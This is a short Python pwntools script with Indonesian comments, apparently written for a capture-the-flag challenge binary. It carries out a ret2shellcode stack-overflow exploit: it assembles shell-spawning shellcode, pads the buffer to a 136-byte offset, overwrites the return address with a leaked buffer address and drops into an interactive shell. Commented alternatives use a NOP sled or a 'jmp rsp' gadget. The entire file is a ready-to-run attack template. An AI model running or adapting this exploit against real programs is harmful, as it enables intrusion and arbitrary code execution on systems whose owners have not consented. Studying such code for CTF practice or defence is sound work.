# Script exploit ret2shellcode dengan pwntools - NX disabled, lompat ke shellcode di buffer.
# Jalankan: python3 ret2shellcode.py

from pwn import *

# ===== Konfigurasi =====
context.arch = "amd64"
context.binary = elf = ELF("./chall")
io = process("./chall")                 # local
# io = remote("host.ctf.com", 1337)     # remote

# ===== Alamat buffer (dari leak program / gdb) =====
buf_addr = 0x7ffffffde000   # GANTI dengan alamat buffer yang di-leak

# ===== Offset =====
offset = 136

# ===== Shellcode =====
shellcode = asm(shellcraft.sh())
print(f"[+] Shellcode ({len(shellcode)} bytes):")
print(disasm(shellcode))

# ===== Payload =====
# opsi 1: lompat ke awal buffer
payload = shellcode
payload += b"A" * (offset - len(shellcode))
payload += p64(buf_addr)

# opsi 2: NOP sled supaya tidak harus tepat
# payload = b"\x90" * 64 + shellcode
# payload += b"A" * (offset - 64 - len(shellcode))
# payload += p64(buf_addr + 32)

# opsi 3: jmp rsp (tidak perlu tahu alamat buffer)
# jmp_rsp = 0x401012   # dari ROPgadget
# payload = b"A" * offset + p64(jmp_rsp) + shellcode

io.sendline(payload)
io.interactive()
